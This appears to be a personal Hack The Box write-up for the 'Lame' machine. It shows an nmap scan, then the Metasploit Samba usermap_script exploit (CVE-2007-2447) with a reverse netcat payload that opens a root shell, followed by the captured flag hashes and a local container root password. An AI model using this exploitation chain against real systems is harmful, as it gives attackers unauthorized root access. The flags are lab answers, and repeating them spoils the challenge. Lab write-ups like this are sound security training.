# Lame - HTB Easy

## Setup

```
cd ~/Library/Mobile\ Documents/com~apple~CloudDocs/Offensive-Security/
```

```
exegol start htb_lame --vpn "/Users/yanisyanis/Library/Mobile Documents/com~apple~CloudDocs/Offensive-Security/lab_nisya.ovpn" --disable-X11 --desktop
ode
```

```
│      Credentials │ root : lguA1mrucsImkgAbu0yJp7FogFC08p                                                                                              │
│   Remote Desktop │ http://localhost:58345 
```

## Nmap

```
nmap -sC -sV -oA nmap 10.10.10.3  --stats-every=5s                                                                        
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-30 22:59 CEST
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 23:00 (0:00:06 remaining)
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 23:00 (0:00:04 remaining)
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.59% done; ETC: 23:00 (0:00:00 remaining)
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.03% done; ETC: 23:00 (0:00:00 remaining)
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.20% done; ETC: 23:00 (0:00:00 remaining)
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 23:00 (0:00:00 remaining)
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 23:00 (0:00:00 remaining)
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 23:00 (0:00:00 remaining)
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 23:00 (0:00:00 remaining)
Stats: 0:00:51 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 23:00 (0:00:00 remaining)
Nmap scan report for 10.10.10.3
Host is up (0.026s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m20s, deviation: 2h49m43s, median: 19s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-09-30T17:00:23-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.15 seconds
```

## CVE [2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)

```
msfconsole -q
msf6 > search Samba 3.0.20                                                                                                                                                                                 

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options       

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CreateSession  true             no        Create a new session for every successful login
   LHOST          172.17.0.2       yes       The listen address (an interface may be specified)
   LPORT          4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.16.4
LHOST => 10.10.16.4
msf6 exploit(multi/samba/usermap_script) > show options                                                                                                                                                    

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.10.3       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   CreateSession  true             no        Create a new session for every successful login
   LHOST          10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT          4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Command shell session 1 opened (10.10.16.4:4444 -> 10.10.10.3:34678) at 2024-09-30 23:02:04 +0200

whoami
root
pwd
/
whoami
root
hostname
lame
ls -l /home/maki
ls: cannot access /home/maki: No such file or directory
ls /home/makis
user.txt
cat /home/makis/user.txt
27aa397b480bfa3bf8e8ecdcb9363017
ls /root/
Desktop
reset_logs.sh
root.txt
vnc.log
cat root/root.txt
dafb948eaf700e22d2a86dae3093e4f7
27aa397b480bfa3bf8e8ecdcb9363017

```
